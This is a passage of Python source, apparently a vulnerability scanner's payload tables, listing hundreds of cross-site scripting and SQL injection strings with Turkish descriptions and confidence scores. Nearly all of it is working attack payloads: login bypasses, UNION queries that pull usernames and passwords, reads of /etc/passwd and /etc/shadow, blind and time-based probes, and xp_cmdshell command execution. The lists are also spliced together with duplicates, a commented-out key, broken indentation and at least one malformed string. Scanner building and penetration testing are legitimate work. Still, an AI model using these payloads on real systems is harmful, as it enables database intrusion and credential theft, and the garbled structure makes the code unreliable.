                {"payload": "<math><mi href=\"javascript:alert('XSS')\">click", "guven": 0.8, "aciklama": "Math mi href"},
                {"payload": "<style>body{background:url(javascript:alert('XSS'))}</style>", "guven": 0.8, "aciklama": "CSS background URL"},
                {"payload": "<base href=\"javascript://\"/><a href=\",alert('XSS')//\">click</a>", "guven": 0.85, "aciklama": "Base href javascript"},
                {"payload": "<script>/**/alert('XSS')</script>", "guven": 0.8, "aciklama": "Comment bypass"},
                {"payload": "<script>&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;</script>", "guven": 0.85, "aciklama": "HTML entity encoding"},
                {"payload": "<img src=\"javascript:alert('XSS')\">", "guven": 0.8, "aciklama": "IMG src javascript"},
                {"payload": "<iframe srcdoc=\"<script>alert('XSS')</script>\">", "guven": 0.85, "aciklama": "Iframe srcdoc"}
                
                
            ],
            
            ZafiyetTipi.SQLI: [
                #ZafiyetTipi.SQLI: [
                # Temel SQL Injection
                {"payload": "' OR '1'='1", "guven": 0.9, "aciklama": "Klasik OR bypass"},
                {"payload": "' OR 1=1--", "guven": 0.9, "aciklama": "OR bypass ile yorum"},
                {"payload": "\" OR \"1\"=\"1", "guven": 0.9, "aciklama": "Çift tırnak OR bypass"},
                {"payload": "' OR 'a'='a", "guven": 0.85, "aciklama": "Alternatif OR bypass"},
                {"payload": "admin'--", "guven": 0.8, "aciklama": "Admin kullanıcı bypass"},
                {"payload": "' OR 1=1#", "guven": 0.9, "aciklama": "MySQL yorum karakteri"},
                {"payload": "' OR 1=1/*", "guven": 0.85, "aciklama": "Çok satırlı yorum"},
                
                # Ek Temel SQL Injection
                {"payload": "' OR 'x'='x'--", "guven": 0.9, "aciklama": "X karakteri OR bypass"},
                {"payload": "') OR ('1'='1", "guven": 0.85, "aciklama": "Parantez kaçışı OR"},
                {"payload": "' OR true--", "guven": 0.9, "aciklama": "Boolean true bypass"},
                {"payload": "' OR 2>1--", "guven": 0.85, "aciklama": "Matematik karşılaştırma"},
                {"payload": "admin') OR ('1'='1'#", "guven": 0.85, "aciklama": "Admin parantez bypass"},
                {"payload": "' OR EXISTS(SELECT 1)--", "guven": 0.8, "aciklama": "EXISTS subquery"},
                {"payload": "' OR 1 IN (1,2,3)--", "guven": 0.8, "aciklama": "IN operatörü bypass"},
                
                # Union Based Injection
                {"payload": "' UNION SELECT NULL--", "guven": 0.9, "aciklama": "Temel UNION seçimi"},
                {"payload": "' UNION SELECT NULL, NULL--", "guven": 0.9, "aciklama": "2 kolon UNION"},
                {"payload": "' UNION SELECT NULL, NULL, NULL--", "guven": 0.9, "aciklama": "3 kolon UNION"},
                {"payload": "' UNION SELECT 1,2,3--", "guven": 0.85, "aciklama": "Sayısal UNION"},
                {"payload": "' UNION SELECT username, password FROM users--", "guven": 0.95, "aciklama": "Kullanıcı bilgileri çekme"},
                {"payload": "' UNION SELECT version()--", "guven": 0.9, "aciklama": "Veritabanı versiyonu"},
                {"payload": "' UNION SELECT database()--", "guven": 0.9, "aciklama": "Veritabanı adı"},
                {"payload": "' UNION SELECT user()--", "guven": 0.9, "aciklama": "Mevcut kullanıcı"},
                {"payload": "' UNION SELECT @@version--", "guven": 0.9, "aciklama": "MySQL versiyon bilgisi"},
                        {"payload": "' OR 1=1--", "guven": 0.95, "aciklama": "OR bypass ile yorum satırı"},
        {"payload": "\" OR \"1\"=\"1", "guven": 0.95, "aciklama": "Çift tırnak ile OR bypass"},
        {"payload": "' OR 'a'='a", "guven": 0.90, "aciklama": "Alternatif karakter OR bypass"},
        {"payload": "admin'--", "guven": 0.85, "aciklama": "Admin kullanıcı bypass denemesi"},
        {"payload": "' OR 1=1#", "guven": 0.95, "aciklama": "MySQL hash yorum karakteri"},
        {"payload": "' OR 1=1/*", "guven": 0.90, "aciklama": "Çok satırlı yorum başlangıcı"},
        {"payload": "') OR ('1'='1", "guven": 0.90, "aciklama": "Parantez kaçışı ile OR"},
        {"payload": "' OR true--", "guven": 0.95, "aciklama": "Boolean true değeri"},
        {"payload": "' OR 2>1--", "guven": 0.90, "aciklama": "Matematik karşılaştırma"},
        {"payload": "admin') OR ('1'='1'#", "guven": 0.90, "aciklama": "Admin parantez bypass"},
        {"payload": "' OR EXISTS(SELECT 1)--", "guven": 0.85, "aciklama": "EXISTS subquery kontrolü"},
        {"payload": "' OR 1 IN (1,2,3)--", "guven": 0.85, "aciklama": "IN operatörü ile bypass"},
        {"payload": "' OR 'x'='x'--", "guven": 0.95, "aciklama": "X karakteri OR bypass"},
        {"payload": "' OR ISNULL(1/0, 1)--", "guven": 0.80, "aciklama": "ISNULL fonksiyonu bypass"},
        {"payload": "' OR ASCII('A')=65--", "guven": 0.85, "aciklama": "ASCII değer karşılaştırması"},
        {"payload": "' OR LEN('A')=1--", "guven": 0.85, "aciklama": "String uzunluk kontrolü"},
        {"payload": "' OR POWER(2,2)=4--", "guven": 0.80, "aciklama": "Matematik fonksiyon bypass"},
        {"payload": "' OR SQRT(4)=2--", "guven": 0.80, "aciklama": "Karekök fonksiyon bypass"},
        {"payload": "' OR ABS(-1)=1--", "guven": 0.80, "aciklama": "Mutlak değer fonksiyonu"},
        {"payload": "' OR CEILING(1.1)=2--", "guven": 0.80, "aciklama": "Tavan fonksiyonu"},
        {"payload": "' OR FLOOR(1.9)=1--", "guven": 0.80, "aciklama": "Taban fonksiyonu"},
        {"payload": "' OR ROUND(1.5)=2--", "guven": 0.80, "aciklama": "Yuvarlama fonksiyonu"},
        {"payload": "' OR SIGN(5)=1--", "guven": 0.80, "aciklama": "İşaret fonksiyonu"},
        {"payload": "' OR MOD(5,2)=1--", "guven": 0.80, "aciklama": "Modül operatörü"},
        {"payload": "' OR GREATEST(1,2,3)=3--", "guven": 0.80, "aciklama": "En büyük değer fonksiyonu"},
        {"payload": "' OR LEAST(1,2,3)=1--", "guven": 0.80, "aciklama": "En küçük değer fonksiyonu"},
        {"payload": "' OR RAND()>=0--", "guven": 0.85, "aciklama": "Rastgele sayı fonksiyonu"},
        {"payload": "' OR NOW()>='1970-01-01'--", "guven": 0.85, "aciklama": "Tarih fonksiyonu"},
        {"payload": "' OR CURDATE()>='1970-01-01'--", "guven": 0.85, "aciklama": "Mevcut tarih fonksiyonu"},
        {"payload": "' OR CURTIME()>='00:00:00'--", "guven": 0.85, "aciklama": "Mevcut saat fonksiyonu"},
        {"payload": "' OR DAYOFWEEK(NOW())>=1--", "guven": 0.80, "aciklama": "Haftanın günü fonksiyonu"},
        {"payload": "' OR MONTH(NOW())>=1--", "guven": 0.80, "aciklama": "Ay fonksiyonu"},
        {"payload": "' OR YEAR(NOW())>=1970--", "guven": 0.80, "aciklama": "Yıl fonksiyonu"},
        {"payload": "' OR HOUR(NOW())>=0--", "guven": 0.80, "aciklama": "Saat fonksiyonu"},
        {"payload": "' OR MINUTE(NOW())>=0--", "guven": 0.80, "aciklama": "Dakika fonksiyonu"},
        {"payload": "' OR SECOND(NOW())>=0--", "guven": 0.80, "aciklama": "Saniye fonksiyonu"},
        {"payload": "' OR CHAR(65)='A'--", "guven": 0.85, "aciklama": "CHAR fonksiyonu"},
        {"payload": "' OR CONCAT('A','B')='AB'--", "guven": 0.85, "aciklama": "String birleştirme"},
        {"payload": "' OR SUBSTRING('ABC',1,1)='A'--", "guven": 0.85, "aciklama": "Alt string fonksiyonu"},
        {"payload": "' OR LEFT('ABC',1)='A'--", "guven": 0.85, "aciklama": "Sol karakter alma"},
        {"payload": "' OR RIGHT('ABC',1)='C'--", "guven": 0.85, "aciklama": "Sağ karakter alma"},
        {"payload": "' OR UPPER('abc')='ABC'--", "guven": 0.85, "aciklama": "Büyük harf dönüşümü"},
        {"payload": "' OR LOWER('ABC')='abc'--", "guven": 0.85, "aciklama": "Küçük harf dönüşümü"},
        {"payload": "' OR LTRIM(' ABC')='ABC'--", "guven": 0.80, "aciklama": "Sol boşluk temizleme"},
        {"payload": "' OR RTRIM('ABC ')='ABC'--", "guven": 0.80, "aciklama": "Sağ boşluk temizleme"},
        {"payload": "' OR TRIM(' ABC ')='ABC'--", "guven": 0.80, "aciklama": "Boşluk temizleme"},
        {"payload": "' OR REPLACE('ABC','B','X')='AXC'--", "guven": 0.80, "aciklama": "String değiştirme"},
        {"payload": "' OR REVERSE('ABC')='CBA'--", "guven": 0.80, "aciklama": "String ters çevirme"},
        {"payload": "' OR REPEAT('A',3)='AAA'--", "guven": 0.80, "aciklama": "String tekrarlama"},
        {"payload": "' OR SPACE(3)='   '--", "guven": 0.75, "aciklama": "Boşluk oluşturma"},

        # === UNION BASED INJECTION (51-100) ===
        {"payload": "' UNION SELECT NULL--", "guven": 0.95, "aciklama": "Temel UNION seçimi"},
        {"payload": "' UNION SELECT NULL,NULL--", "guven": 0.95, "aciklama": "2 kolon UNION"},
        {"payload": "' UNION SELECT NULL,NULL,NULL--", "guven": 0.95, "aciklama": "3 kolon UNION"},
        {"payload": "' UNION SELECT NULL,NULL,NULL,NULL--", "guven": 0.95, "aciklama": "4 kolon UNION"},
        {"payload": "' UNION SELECT NULL,NULL,NULL,NULL,NULL--", "guven": 0.95, "aciklama": "5 kolon UNION"},
        {"payload": "' UNION SELECT 1,2,3,4,5,6--", "guven": 0.90, "aciklama": "6 kolon sayısal UNION"},
        {"payload": "' UNION SELECT version(),NULL--", "guven": 0.95, "aciklama": "Veritabanı versiyonu"},
        {"payload": "' UNION SELECT database(),NULL--", "guven": 0.95, "aciklama": "Veritabanı adı"},
        {"payload": "' UNION SELECT user(),NULL--", "guven": 0.95, "aciklama": "Mevcut kullanıcı"},
        {"payload": "' UNION SELECT @@version,NULL--", "guven": 0.95, "aciklama": "MySQL versiyon bilgisi"},
        {"payload": "' UNION SELECT current_user(),NULL--", "guven": 0.90, "aciklama": "Mevcut kullanıcı MySQL"},
        {"payload": "' UNION SELECT session_user(),NULL--", "guven": 0.90, "aciklama": "Oturum kullanıcısı"},
        {"payload": "' UNION SELECT system_user(),NULL--", "guven": 0.90, "aciklama": "Sistem kullanıcısı"},
        {"payload": "' UNION SELECT @@hostname,NULL--", "guven": 0.85, "aciklama": "Sunucu hostname"},
        {"payload": "' UNION SELECT @@datadir,NULL--", "guven": 0.85, "aciklama": "Veri dizini"},
        {"payload": "' UNION SELECT @@basedir,NULL--", "guven": 0.85, "aciklama": "Temel dizin"},
        {"payload": "' UNION SELECT @@tmpdir,NULL--", "guven": 0.80, "aciklama": "Geçici dizin"},
        {"payload": "' UNION SELECT @@pid_file,NULL--", "guven": 0.80, "aciklama": "Process ID dosyası"},
        {"payload": "' UNION SELECT @@socket,NULL--", "guven": 0.80, "aciklama": "Socket bilgisi"},
        {"payload": "' UNION SELECT @@port,NULL--", "guven": 0.85, "aciklama": "Port bilgisi"},
        {"payload": "' UNION SELECT schema_name,NULL FROM information_schema.schemata--", "guven": 0.95, "aciklama": "Veritabanı şemaları"},
        {"payload": "' UNION SELECT table_name,NULL FROM information_schema.tables--", "guven": 0.95, "aciklama": "Tablo isimleri"},
        {"payload": "' UNION SELECT column_name,NULL FROM information_schema.columns--", "guven": 0.95, "aciklama": "Kolon isimleri"},
        {"payload": "' UNION SELECT table_schema,table_name FROM information_schema.tables--", "guven": 0.95, "aciklama": "Şema ve tablo isimleri"},
        {"payload": "' UNION SELECT column_name,data_type FROM information_schema.columns--", "guven": 0.90, "aciklama": "Kolon ve veri türleri"},
        {"payload": "' UNION SELECT routine_name,routine_type FROM information_schema.routines--", "guven": 0.85, "aciklama": "Stored procedure'lar"},
        {"payload": "' UNION SELECT trigger_name,event_manipulation FROM information_schema.triggers--", "guven": 0.85, "aciklama": "Trigger bilgileri"},
        {"payload": "' UNION SELECT constraint_name,constraint_type FROM information_schema.table_constraints--", "guven": 0.80, "aciklama": "Kısıtlama bilgileri"},
        {"payload": "' UNION SELECT grantee,privilege_type FROM information_schema.user_privileges--", "guven": 0.85, "aciklama": "Kullanıcı yetkileri"},
        {"payload": "' UNION SELECT variable_name,variable_value FROM information_schema.global_variables--", "guven": 0.80, "aciklama": "Global değişkenler"},
        {"payload": "' UNION SELECT engine,support FROM information_schema.engines--", "guven": 0.75, "aciklama": "Veritabanı motorları"},
        {"payload": "' UNION SELECT character_set_name,default_collate_name FROM information_schema.character_sets--", "guven": 0.75, "aciklama": "Karakter setleri"},
        {"payload": "' UNION SELECT collation_name,character_set_name FROM information_schema.collations--", "guven": 0.75, "aciklama": "Collation bilgileri"},
        {"payload": "' UNION SELECT load_file('/etc/passwd'),NULL--", "guven": 0.95, "aciklama": "Dosya okuma saldırısı"},
        {"payload": "' UNION SELECT load_file('/etc/shadow'),NULL--", "guven": 0.95, "aciklama": "Shadow dosyası okuma"},
        {"payload": "' UNION SELECT load_file('/etc/hosts'),NULL--", "guven": 0.90, "aciklama": "Hosts dosyası okuma"},
        {"payload": "' UNION SELECT load_file('/proc/version'),NULL--", "guven": 0.85, "aciklama": "Sistem versiyon bilgisi"},
        {"payload": "' UNION SELECT load_file('/proc/meminfo'),NULL--", "guven": 0.80, "aciklama": "Bellek bilgisi"},
        {"payload": "' UNION SELECT load_file('/proc/cpuinfo'),NULL--", "guven": 0.80, "aciklama": "İşlemci bilgisi"},
        {"payload": "' UNION SELECT username,password FROM users--", "guven": 0.98, "aciklama": "Kullanıcı bilgileri çekme"},
        {"payload": "' UNION SELECT email,password FROM users--", "guven": 0.95, "aciklama": "Email ve şifre çekme"},
        {"payload": "' UNION SELECT id,username FROM users WHERE id=1--", "guven": 0.95, "aciklama": "Belirli kullanıcı bilgisi"},
        {"payload": "' UNION SELECT COUNT(*),NULL FROM users--", "guven": 0.90, "aciklama": "Kullanıcı sayısı"},
        {"payload": "' UNION SELECT MIN(id),MAX(id) FROM users--", "guven": 0.85, "aciklama": "Min-Max ID değerleri"},
        {"payload": "' UNION SELECT GROUP_CONCAT(username),NULL FROM users--", "guven": 0.95, "aciklama": "Tüm kullanıcı isimleri"},
        {"payload": "' UNION SELECT GROUP_CONCAT(table_name),NULL FROM information_schema.tables WHERE table_schema=database()--", "guven": 0.95, "aciklama": "Mevcut DB tabloları"},
        {"payload": "' UNION SELECT GROUP_CONCAT(column_name),NULL FROM information_schema.columns WHERE table_name='users'--", "guven": 0.95, "aciklama": "Users tablosu kolonları"},
        {"payload": "' UNION SELECT HEX(password),username FROM users--", "guven": 0.90, "aciklama": "Hex encoded şifreler"},
        {"payload": "' UNION SELECT UNHEX('48656C6C6F'),NULL--", "guven": 0.80, "aciklama": "Hex decode işlemi"},
        {"payload": "' UNION SELECT TO_BASE64(password),username FROM users--", "guven": 0.85, "aciklama": "Base64 encoded şifreler"},
        {"payload": "' UNION SELECT FROM_BASE64('SGVsbG8='),NULL--", "guven": 0.80, "aciklama": "Base64 decode işlemi"},

        # === BOOLEAN BASED BLIND INJECTION (101-150) ===
        {"payload": "' AND 1=1--", "guven": 0.85, "aciklama": "True koşul testi"},
        {"payload": "' AND 1=2--", "guven": 0.85, "aciklama": "False koşul testi"},
        {"payload": "' AND (SELECT COUNT(*) FROM users)>0--", "guven": 0.90, "aciklama": "Tablo varlık testi"},
        {"payload": "' AND LENGTH(database())>0--", "guven": 0.90, "aciklama": "Database uzunluk testi"},
        {"payload": "' AND ASCII(SUBSTRING(user(),1,1))>64--", "guven": 0.90, "aciklama": "Karakter ASCII testi"},
        {"payload": "' AND (SELECT COUNT(*) FROM information_schema.tables)>0--", "guven": 0.90, "aciklama": "Information schema testi"},
        {"payload": "' AND SUBSTRING(version(),1,1)='5'--", "guven": 0.85, "aciklama": "Versiyon karakter testi"},
        {"payload": "' AND (SELECT username FROM users LIMIT 1)='admin'--", "guven": 0.90, "aciklama": "Kullanıcı adı testi"},
        {"payload": "' AND ORD(MID(version(),1,1))>52--", "guven": 0.85, "aciklama": "ORD MID karakter testi"},
        {"payload": "' AND CHAR_LENGTH(database())=4--", "guven": 0.85, "aciklama": "Database uzunluk eşitlik"},
        {"payload": "' AND (SELECT COUNT(*) FROM users WHERE username='admin')=1--", "guven": 0.90, "aciklama": "Admin kullanıcı varlık testi"},
        {"payload": "' AND (SELECT LENGTH(password) FROM users WHERE username='admin')>5--", "guven": 0.90, "aciklama": "Şifre uzunluk testi"},
        {"payload": "' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='admin')>64--", "guven": 0.90, "aciklama": "Şifre ilk karakter testi"},
        {"payload": "' AND (SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>0--", "guven": 0.85, "aciklama": "Mevcut DB tablo sayısı"},
        {"payload": "' AND (SELECT COUNT(*) FROM information_schema.columns WHERE table_name='users')>2--", "guven": 0.85, "aciklama": "Users tablosu kolon sayısı"},
        {"payload": "' AND EXISTS(SELECT * FROM users WHERE username='admin')--", "guven": 0.90, "aciklama": "Admin kullanıcı EXISTS testi"},
        {"payload": "' AND EXISTS(SELECT * FROM information_schema.tables WHERE table_name='users')--", "guven": 0.85, "aciklama": "Users tablosu EXISTS testi"},
        {"payload": "' AND (SELECT user()) LIKE 'root%'--", "guven": 0.85, "aciklama": "Root kullanıcı LIKE testi"},
        {"payload": "' AND (SELECT database()) REGEXP '^[a-z]'--", "guven": 0.80, "aciklama": "Database regex testi"},
        {"payload": "' AND (SELECT version()) RLIKE '5\\.[0-9]'--", "guven": 0.80, "aciklama": "Versiyon regex testi"},
        {"payload": "' AND BINARY SUBSTRING(user(),1,1)='R'--", "guven": 0.85, "aciklama": "Case sensitive karakter testi"},
        {"payload": "' AND (SELECT HEX(password) FROM users WHERE id=1) LIKE '5E%'--", "guven": 0.85, "aciklama": "Hex şifre pattern testi"},
        {"payload": "' AND (SELECT COUNT(*) FROM users)=(SELECT COUNT(*) FROM users WHERE id>0)--", "guven": 0.80, "aciklama": "ID pozitiflik testi"},
        {"payload": "' AND (SELECT MAX(id) FROM users)>(SELECT MIN(id) FROM users)--", "guven": 0.80, "aciklama": "ID range testi"},
        {"payload": "' AND (SELECT username FROM users ORDER BY id LIMIT 1)='admin'--", "guven": 0.85, "aciklama": "İlk kullanıcı testi"},
        {"payload": "' AND (SELECT password FROM users ORDER BY id DESC LIMIT 1) IS NOT NULL--", "guven": 0.80, "aciklama": "Son kullanıcı şifre testi"},
        {"payload": "' AND STRCMP((SELECT username FROM users LIMIT 1),'admin')=0--", "guven": 0.80, "aciklama": "String karşılaştırma testi"},
        {"payload": "' AND LOCATE('admin',(SELECT username FROM users LIMIT 1))>0--", "guven": 0.80, "aciklama": "String konum testi"},
        {"payload": "' AND INSTR((SELECT username FROM users LIMIT 1),'admin')>0--", "guven": 0.80, "aciklama": "String içerik testi"},
        {"payload": "' AND POSITION('admin' IN (SELECT username FROM users LIMIT 1))>0--", "guven": 0.80, "aciklama": "String pozisyon testi"},
        {"payload": "' AND (SELECT COUNT(DISTINCT username) FROM users)=(SELECT COUNT(*) FROM users)--", "guven": 0.75, "aciklama": "Unique username testi"},
        {"payload": "' AND (SELECT password FROM users WHERE username='admin') IN (SELECT password FROM users)--", "guven": 0.80, "aciklama": "Şifre IN testi"},
        {"payload": "' AND (SELECT role FROM users WHERE username='admin')='administrator'--", "guven": 0.85, "aciklama": "Kullanıcı rol testi"},
        {"payload": "' AND (SELECT status FROM users WHERE username='admin')='active'--", "guven": 0.80, "aciklama": "Kullanıcı durum testi"},
        {"payload": "' AND (SELECT created_at FROM users WHERE username='admin')>='2020-01-01'--", "guven": 0.75, "aciklama": "Oluşturma tarihi testi"},
        {"payload": "' AND (SELECT last_login FROM users WHERE username='admin') IS NOT NULL--", "guven": 0.75, "aciklama": "Son giriş testi"},
        {"payload": "' AND (SELECT email FROM users WHERE username='admin') LIKE '%@admin.com'--", "guven": 0.80, "aciklama": "Email domain testi"},
        {"payload": "' AND (SELECT phone FROM users WHERE username='admin') REGEXP '^[0-9]'--", "guven": 0.75, "aciklama": "Telefon numarası pattern testi"},
        {"payload": "' AND (SELECT COUNT(*) FROM users WHERE password IS NULL)=0--", "guven": 0.75, "aciklama": "Null şifre testi"},
        {"payload": "' AND (SELECT COUNT(*) FROM users WHERE LENGTH(password)<8)=0--", "guven": 0.75, "aciklama": "Minimum şifre uzunluğu testi"},
        {"payload": "' AND (SELECT AVG(LENGTH(password)) FROM users)>6--", "guven": 0.70, "aciklama": "Ortalama şifre uzunluğu"},
        {"payload": "' AND (SELECT SUM(id) FROM users)>(SELECT COUNT(*) FROM users)--", "guven": 0.70, "aciklama": "ID toplamı testi"},
        {"payload": "' AND (SELECT GROUP_CONCAT(username) FROM users) LIKE '%admin%'--", "guven": 0.80, "aciklama": "Kullanıcı listesi testi"},
        {"payload": "' AND (SELECT table_name FROM information_schema.tables WHERE table_schema=database() LIMIT 1)='users'--", "guven": 0.80, "aciklama": "İlk tablo ismi testi"},
        {"payload": "' AND (SELECT column_name FROM information_schema.columns WHERE table_name='users' LIMIT 1)='id'--", "guven": 0.80, "aciklama": "İlk kolon ismi testi"},
        {"payload": "' AND (SELECT data_type FROM information_schema.columns WHERE table_name='users' AND column_name='id')='int'--", "guven": 0.75, "aciklama": "Kolon veri tipi testi"},
        {"payload": "' AND (SELECT is_nullable FROM information_schema.columns WHERE table_name='users' AND column_name='username')='NO'--", "guven": 0.75, "aciklama": "Kolon null kontrolü"},
        {"payload": "' AND (SELECT character_maximum_length FROM information_schema.columns WHERE table_name='users' AND column_name='username')>10--", "guven": 0.70, "aciklama": "Kolon maksimum uzunluk"},
        {"payload": "' AND (SELECT table_rows FROM information_schema.tables WHERE table_name='users')>0--", "guven": 0.75, "aciklama": "Tablo satır sayısı"},
        {"payload": "' AND (SELECT auto_increment FROM information_schema.tables WHERE table_name='users')>1--", "guven": 0.70, "aciklama": "Auto increment değeri"},
        {"payload": "' AND (SELECT engine FROM information_schema.tables WHERE table_name='users')='InnoDB'--", "guven": 0.70, "aciklama": "Tablo engine testi"},

        # === TIME BASED BLIND INJECTION (151-200) ===
        {"payload": "'; WAITFOR DELAY '00:00:05'--", "guven": 0.95, "aciklama": "SQL Server 5 saniye gecikme"},
        {"payload": "' AND SLEEP(5)--", "guven": 0.95, "aciklama": "MySQL 5 saniye sleep"},
        {"payload": "'; SELECT pg_sleep(5)--", "guven": 0.95, "aciklama": "PostgreSQL 5 saniye sleep"},
        {"payload": "' AND (SELECT * FROM (SELECT(SLEEP(5)))a)--", "guven": 0.90, "aciklama": "MySQL subquery sleep"},
        {"payload": "' AND IF(1=1,SLEEP(5),0)--", "guven": 0.95, "aciklama": "Koşullu MySQL sleep"},
        {"payload": "'; SELECT CASE WHEN (1=1) THEN pg_sleep(5) ELSE 0 END--", "guven": 0.95, "aciklama": "PostgreSQL koşullu sleep"},
        {"payload": "' AND (SELECT COUNT(*) FROM users WHERE SLEEP(2))>0--", "guven": 0.90, "aciklama": "WHERE clause sleep"},
        {"payload": "'; IF(1=1) WAITFOR DELAY '00:00:03'--", "guven": 0.95, "aciklama": "SQL Server koşullu gecikme"},
        {"payload": "' UNION SELECT SLEEP(3),NULL--", "guven": 0.90, "aciklama": "UNION sleep"},
        {"payload": "' AND IF(ASCII(SUBSTRING(user(),1,1))>64,SLEEP(5),0)--", "guven": 0.95, "aciklama": "Karakter tabanlı sleep"},
        {"payload": "' AND IF(LENGTH(database())>5,SLEEP(3),0)--", "guven": 0.90, "aciklama": "Database uzunluk sleep"},
        {"payload": "' AND IF((SELECT COUNT(*) FROM users)>0,SLEEP(4),0)--", "guven": 0.90, "aciklama": "Tablo varlık sleep"},
        {"payload": "' AND IF(SUBSTRING(version(),1,1)='5',SLEEP(3),0)--", "guven": 0.85, "aciklama": "Versiyon karakter sleep"},
        {"payload": "' AND IF((SELECT username FROM users LIMIT 1)='admin',SLEEP(5),0)--", "guven": 0.90, "aciklama": "Kullanıcı adı sleep"},
        {"payload": "' AND IF(EXISTS(SELECT * FROM users WHERE username='admin'),SLEEP(4),0)--", "guven": 0.90, "aciklama": "Admin EXISTS sleep"},
        {"payload": "'; EXEC xp_cmdshell('ping -n 6 localhost')--", "guven": 0.98, "aciklama": "SQL Server komut çalıştırma"},
        {"payload": "'; EXEC master..xp_cmdshell 'powershell Start-Sleep -s 5'--", "guven": 0.98, "aciklama": "PowerShell sleep komutu"},
        {"payload": "' AND (SELECT CASE WHEN (1=1) THEN SLEEP(3) ELSE 0 END)--", "guven": 0.90, "aciklama": "MySQL CASE sleep"},
        {"payload": "' AND (SELECT IF(1=1,BENCHMARK(5000000,SHA1('test')),0))--", "guven": 0.95, "aciklama": "MySQL BENCHMARK gecikme"},
        {"payload": "' AND (SELECT IF(1=1,(SELECT COUNT(*) FROM information_schema.tables t1, information_schema.tables t2, information_schema.tables t3),0))--", "guven": 0.90, "aciklama": "Cartesian product gecikme"},
        {"payload": "'; DECLARE @x CHAR(8000);SET @x=REPLICATE('A',8000);WAITFOR DELAY '00:00:03'--", "guven": 0.90, "aciklama": "SQL Server memory + delay"},
        {"payload": "' AND (SELECT CASE WHEN ASCII(SUBSTRING(user(),1,1))>64 THEN pg_sleep(3) ELSE 0 END)--", "guven": 0.90, "aciklama": "PostgreSQL karakter sleep"},
        {"payload": "' AND IF((SELECT LENGTH(password) FROM users WHERE username='admin')>5,SLEEP(4),0)--", "guven": 0.90, "aciklama": "Şifre uzunluk sleep"},
        {"payload": "' AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=database())>5,SLEEP(3),0)--", "guven": 0.85, "aciklama": "Tablo sayısı sleep"},
        {"payload": "' AND IF(LOCATE('admin',(SELECT GROUP_CONCAT(username) FROM users))>0,SLEEP(5),0)--", "guven": 0.85, "aciklama": "Admin arama sleep"},
        {"payload": "' AND (SELECT CASE WHEN (SELECT user()) LIKE 'root%' THEN SLEEP(4) ELSE 0 END)--", "guven": 0.85, "aciklama": "Root kullanıcı sleep"},
        {"payload": "' AND IF((SELECT @@version) LIKE '%MySQL%',SLEEP(3),0)--", "guven": 0.85, "aciklama": "MySQL versiyon sleep"},
        {"payload": "' AND IF((SELECT COUNT(*) FROM users WHERE role='admin')>0,SLEEP(4),0)--", "guven": 0.80, "aciklama": "Admin rolü sleep"},
        {"payload": "' AND IF((SELECT password FROM users WHERE username='admin') IS NOT NULL,SLEEP(3),0)--", "guven": 0.80, "aciklama": "Admin şifre NULL sleep"},
        {"payload": "' AND IF(BINARY SUBSTRING(user(),1,1)='r',SLEEP(3),0)--", "guven": 0.80, "aciklama": "Case sensitive sleep"},
        {"payload": "' AND (SELECT CASE WHEN HEX(password) LIKE '5E%' THEN SLEEP(3) ELSE 0 END FROM users WHERE id=1)--", "guven": 0.80, "aciklama": "Hex şifre pattern sleep"},
        {"payload": "' AND IF((SELECT MAX(id) FROM users)>10,SLEEP(2),0)--", "guven": 0.75, "aciklama": "Max ID sleep"},
        {"payload": "' AND IF((SELECT COUNT(DISTINCT role) FROM users)>1,SLEEP(3),0)--", "guven": 0.75, "aciklama": "Farklı rol sayısı sleep"},
        {"payload": "' AND IF((SELECT created_at FROM users WHERE username='admin')>'2020-01-01',SLEEP(3),0)--", "guven": 0.75, "aciklama": "Oluşturma tarihi sleep"},
        {"payload": "' AND IF((SELECT email FROM users WHERE username='admin') LIKE '%@admin.com',SLEEP(3),0)--", "guven": 0.75, "aciklama": "Email domain sleep"},
        {"payload": "' AND (SELECT CASE WHEN table_name='users' THEN SLEEP(2) ELSE 0 END FROM information_schema.tables WHERE table_schema=database() LIMIT 1)--", "guven": 0.75, "aciklama": "İlk tablo ismi sleep"},
        {"payload": "' AND IF((SELECT engine FROM information_schema.tables WHERE table_name='users')='InnoDB',SLEEP(2),0)--", "guven": 0.70, "aciklama": "Tablo engine sleep"},
        {"payload": "' AND IF((SELECT auto_increment FROM information_schema.tables WHERE table_name='users')>1,SLEEP(2),0)--", "guven": 0.70, "aciklama": "Auto increment sleep"},
        {"payload": "' AND IF((SELECT SUM(LENGTH(username)) FROM users)>20,SLEEP(2),0)--", "guven": 0.70, "aciklama": "Username uzunluk toplamı sleep"},
        {"payload": "' AND (SELECT CASE WHEN REGEXP_LIKE(user(),'^[a-z]') THEN SLEEP(2) ELSE 0 END)--", "guven": 0.70, "aciklama": "Regex pattern sleep"},
        {"payload": "' AND IF((SELECT COUNT(*) FROM users WHERE password REGEXP '^[a-f0-9]{32})>0,SLEEP(3),0)--", "guven": 0.75, "aciklama": "MD5 hash pattern sleep"},
        {"payload": "' AND IF((SELECT COUNT(*) FROM users WHERE LENGTH(password)=60)>0,SLEEP(3),0)--", "guven": 0.75, "aciklama": "Bcrypt hash uzunluk sleep"},
        {"payload": "' AND IF((SELECT privilege_type FROM information_schema.user_privileges WHERE grantee LIKE '%root%' LIMIT 1)='SELECT',SLEEP(2),0)--", "guven": 0.70, "aciklama": "Kullanıcı yetkisi sleep"},
        {"payload": "' AND IF((SELECT COUNT(*) FROM information_schema.tables WHERE engine='MyISAM')>0,SLEEP(2),0)--", "guven": 0.65, "aciklama": "MyISAM tablo sleep"},
        {"payload": "' AND (SELECT CASE WHEN @@global.read_only=0 THEN SLEEP(2) ELSE 0 END)--", "guven": 0.70, "aciklama": "Read-only modu sleep"},
        {"payload": "' AND IF((SELECT @@global.log_bin)=1,SLEEP(2),0)--", "guven": 0.65, "aciklama": "Binary log sleep"},
        {"payload": "' AND IF((SELECT @@global.general_log)=1,SLEEP(2),0)--", "guven": 0.65, "aciklama": "General log sleep"},
        {"payload": "' AND (SELECT CASE WHEN CONNECTION_ID()>0 THEN SLEEP(1) ELSE 0 END)--", "guven": 0.70, "aciklama": "Connection ID sleep"},
        {"payload": "' AND IF(LAST_INSERT_ID()>=0,SLEEP(1),0)--", "guven": 0.65, "aciklama": "Last insert ID sleep"},
        {"payload": "' AND IF(ROW_COUNT()>=-1,SLEEP(1),0)--", "guven": 0.65, "aciklama": "Row count sleep"},
